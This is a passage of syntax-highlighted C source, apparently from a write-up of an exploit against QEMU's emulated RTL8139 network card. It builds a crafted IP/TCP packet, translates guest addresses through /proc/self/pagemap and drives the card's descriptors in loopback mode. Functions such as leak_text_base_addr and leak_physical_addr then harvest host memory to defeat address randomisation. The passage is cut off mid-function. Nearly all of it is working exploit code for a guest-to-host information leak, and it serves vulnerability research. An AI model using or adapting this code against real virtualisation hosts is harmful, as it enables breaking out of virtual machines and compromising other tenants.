</span></span><span class=line><span class=cl>    <span class=c1>// 首部校验和
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 源IP
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 目的IP
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* TCP数据报 */</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 源端口
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 目的端口
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xbe</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Sequence Number
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Acknowledgement Number
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 报头长度等
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x50</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Window size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xed</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// TCP checksum
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Urgent pointer
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// RTL8139 Rx/Tx descriptor
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>rtl8139_desc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>dw0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>dw1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>buf_lo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>buf_hi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>rtl8139_desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// RTL8139 Rx/Tx ring
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>rtl8139_ring</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>rtl8139_ring</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>pme</span><span class=p>,</span> <span class=n>gfn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pme</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PAGE_PRESENT</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>gfn</span> <span class=o>=</span> <span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PAGE_PFN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>gfn</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_writeb</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>data</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outb</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_writew</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>data</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_writel</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>data</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outl</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_readb</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inb</span><span class=p>(</span><span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_readw</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inw</span><span class=p>(</span><span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_readl</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inl</span><span class=p>(</span><span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_desc_config_rx</span><span class=p>(</span><span class=n>rtl8139_ring</span> <span class=o>*</span><span class=n>ring</span><span class=p>,</span> <span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>buffer_size</span> <span class=o>=</span> <span class=n>RTL8139_BUFFER_SIZE</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>nb</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>desc</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>desc</span><span class=p>[</span><span class=n>i</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>desc</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span> <span class=o>=</span> <span class=nf>aligned_alloc</span><span class=p>(</span><span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>buffer_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nf>memset</span><span class=p>(</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>buffer_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>CP_RX_OWN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>buffer_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span><span class=o>-&gt;</span><span class=n>buf_lo</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// printf(&#34;buffer[%d]: 0x%x\n&#34;, i, ring[i].desc-&gt;buf_lo);  // for debug
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>((</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>desc</span><span class=p>),</span> <span class=n>RxRingAddrLO</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>RxRingAddrHI</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_desc_config_tx</span><span class=p>(</span><span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>desc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_desc</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>CP_TX_OWN</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_EOR</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_LS</span>   <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_IPCS</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_TCPCS</span><span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_LGSEN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>buf_lo</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>((</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>desc</span><span class=p>),</span> <span class=n>TxAddr0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>TxAddr0</span><span class=o>+</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_card_config</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=n>TxLoopBack</span><span class=p>,</span> <span class=n>TxConfig</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=n>AcceptMyPhys</span><span class=p>,</span> <span class=n>RxConfig</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writew</span><span class=p>(</span><span class=n>CPlusRxEnb</span><span class=o>|</span><span class=n>CPlusTxEnb</span><span class=p>,</span> <span class=n>CpCmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writeb</span><span class=p>(</span><span class=n>CmdRxEnb</span><span class=o>|</span><span class=n>CmdTxEnb</span><span class=p>,</span> <span class=n>ChipCmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_packet_send</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>packet</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>len</span> <span class=o>&lt;=</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>packet</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>pmio_writeb</span><span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>6</span><span class=p>,</span> <span class=n>TxPoll</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>xxd</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>,</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>%</span> <span class=mi>16</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>0x%08x: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)(</span><span class=n>ptr</span><span class=o>+</span><span class=n>i</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%02x &#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=mi>7</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>leak_text_base_addr</span><span class=p>(</span><span class=n>rtl8139_ring</span> <span class=o>*</span><span class=n>ring</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>ring_count</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>uint64_t</span> <span class=n>property_release_bool_offset</span> <span class=o>=</span> <span class=mh>0x379DEF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>uint64_t</span> <span class=n>property_get_str</span> <span class=o>=</span> <span class=mh>0x379a57</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>offset</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=n>property_get_str</span><span class=p>,</span> <span class=n>property_release_bool_offset</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>uint64_t</span> <span class=n>mask</span> <span class=o>=</span> <span class=mh>0xFFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>ring_count</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span> <span class=o>+</span> <span class=mi>56</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>end</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>RTL8139_BUFFER_SIZE</span> <span class=o>/</span> <span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>ptr</span> <span class=o>&lt;</span> <span class=n>end</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint64_t</span> <span class=n>value</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>((</span><span class=n>value</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>)</span> <span class=o>==</span> <span class=p>(</span><span class=n>offset</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                 <span class=k>return</span> <span class=n>value</span> <span class=o>-</span> <span class=n>offset</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>ptr</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>leak_physical_addr</span><span class=p>(</span><span class=n>rtl8139_ring</span> <span class=o>*</span><span class=n>ring</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>ring_count</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>uint64_t</span> <span class=n>mask</span> <span class=o>=</span> <span class=mh>0xffff000000ULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>array</span><span class=p>[</span><span class=mh>0x10000</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>array</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>array</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>ring_count</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span> <span class=o>+</span> <span class=mi>56</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>end</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=o>/</span><span class=mi>4</span><span class=o>*</span><span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>ptr</span> <span class=o>&lt;</span> <span class=n>end</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint64_t</span> <span class=n>value</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(((</span><span class=n>value</span> <span class=o>&gt;&gt;</span> <span class=mi>40</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x7f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>value</span> <span class=o>=</span> <span class=p>(</span><span class=n>value</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>array</span><span class=p>[</span><span class=n>value</span><span class=p>]</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>array</span><span class=p>[</span><span class=n>value</span><span class=p>]</span> <span class=o>&gt;</span> <span class=n>array</span><span class=p>[</span><span class=n>index</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>index</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
